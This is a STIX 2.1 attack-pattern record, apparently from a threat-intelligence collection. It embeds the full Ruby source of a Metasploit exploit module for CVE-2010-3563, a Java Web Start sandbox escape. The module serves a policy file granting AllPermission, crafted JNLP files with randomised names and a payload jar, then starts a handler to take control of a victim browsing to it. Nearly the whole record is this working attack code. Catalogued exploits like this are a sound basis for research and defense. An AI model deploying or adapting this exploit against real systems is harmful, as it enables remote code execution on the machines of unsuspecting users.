{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--07e36a65-2e57-4e6b-bcc0-828e8cd50713",
    "created": "2024-08-14T16:43:45.885863Z",
    "modified": "2024-08-14T16:43:45.885867Z",
    "name": "Sun Java Web Start BasicServiceImpl Code Execution",
    "description": " This module exploits a vulnerability in Java Runtime Environment that allows an attacker to escape the Java Sandbox. By injecting a parameter into a javaws call within the BasicServiceImpl class the default java sandbox policy file can be therefore overwritten. The vulnerability affects version 6 prior to update 22.  NOTE: Exploiting this vulnerability causes several sinister-looking popup windows saying that Java is \"Downloading application.\"  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/java_basicservice_impl.rb",
            "external_id": "java_basicservice_impl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3563"
        },
        {
            "source_name": "reference",
            "url": "http://mk41ser.blogspot.com"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  # Internet explorer freaks out and shows the scary yellow info bar if this\n  # is in an iframe.  The exploit itself also creates a couple of scary popup\n  # windows about \"downloading application\" that I haven't been able to\n  # figure out how to prevent.  For both of these reasons, don't include it\n  # in Browser Autopwn.\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({ :javascript => false })\n\n  def initialize( info = {} )\n\n    super( update_info( info,\n      'Name'          => 'Sun Java Web Start BasicServiceImpl Code Execution',\n      'Description'   => %q{\n      This module exploits a vulnerability in Java Runtime Environment\n      that allows an attacker to escape the Java Sandbox. By injecting\n      a parameter into a javaws call within the BasicServiceImpl class\n      the default java sandbox policy file can be therefore overwritten.\n      The vulnerability affects version 6 prior to update 22.\n\n      NOTE: Exploiting this vulnerability causes several sinister-looking\n      popup windows saying that Java is \"Downloading application.\"\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => [\n        'Matthias Kaiser', # Discovery, PoC, metasploit module\n        'egypt' # metasploit module\n      ],\n      'References'    =>\n      [\n        [ 'CVE', '2010-3563' ],\n        [ 'OSVDB', '69043' ],\n        [ 'URL', 'http://mk41ser.blogspot.com' ],\n      ],\n      'Platform'      => %w{ java win },\n      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Windows x86',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win',\n            }\n          ],\n          [ 'Generic (Java Payload)',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java',\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-10-12'\n      ))\n  end\n\n  def on_request_uri( cli, request )\n    jpath = get_uri(cli)\n\n    case request.uri\n    when /java.security.policy/\n      print_status(\"Checking with HEAD\")\n      ack = \"OK\"\n      send_response(cli, ack, { 'Content-Type' => 'application/x-java-jnlp-file' })\n\n    when /all.policy/\n      all = \"grant {permission java.security.AllPermission;};\\n\"\n      print_status(\"Sending all.policy\")\n      send_response(cli, all, { 'Content-Type' => 'application/octet-stream' })\n\n    when /init.jnlp/\n      init = <<-EOS\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<jnlp href=\"#{jpath}/init.jnlp\" version=\"1\">\n#{jnlp_info}\n  <application-desc main-class=\"BasicServiceExploit\">\n    <argument>#{jpath}</argument>\n  </application-desc>\n</jnlp>\nEOS\n      print_status(\"Sending init.jnlp\")\n      send_response(cli, init, { 'Content-Type' => 'application/x-java-jnlp-file' })\n\n    when /exploit.jnlp/\n      expl = <<-EOS\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <jnlp href=\"#{jpath}/exploit.jnlp\" version=\"1\">\n#{jnlp_info}\n  <application-desc main-class=\"Exploit\"/>\n  </jnlp>\nEOS\n      print_status(\"Sending exploit.jnlp\")\n      send_response(cli, expl, { 'Content-Type' => 'application/x-java-jnlp-file' })\n\n    when /\\.jar$/i\n      p = regenerate_payload(cli)\n      paths = [\n        [ \"BasicServiceExploit.class\" ],\n        [ \"Exploit.class\" ],\n      ]\n      dir = [ Msf::Config.data_directory, \"exploits\", \"cve-2010-3563\" ]\n      jar = p.encoded_jar\n      jar.add_files(paths, dir)\n      print_status(\"Sending Jar\")\n      send_response(cli, jar.pack, { 'Content-Type' => \"application/octet-stream\" })\n      handler(cli)\n\n    else\n      print_status(\"Sending redirect to init.jnlp\")\n      send_redirect(cli, get_resource() + '/init.jnlp', '')\n\n    end\n  end\n\n  def jnlp_info\n    buf = <<-EOS\n    <information>\n      <title>#{Rex::Text.rand_text_alpha(rand(10)+10)}</title>\n      <vendor>#{Rex::Text.rand_text_alpha(rand(10)+10)}</vendor>\n      <description>#{Rex::Text.rand_text_alpha(rand(10)+10)}</description>\n    </information>\n    <resources>\n      <java version=\"1.6+\"/>\n      <jar href=\"#{get_uri}/exploit.jar\"/>\n    </resources>\nEOS\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "java'"
    ]
}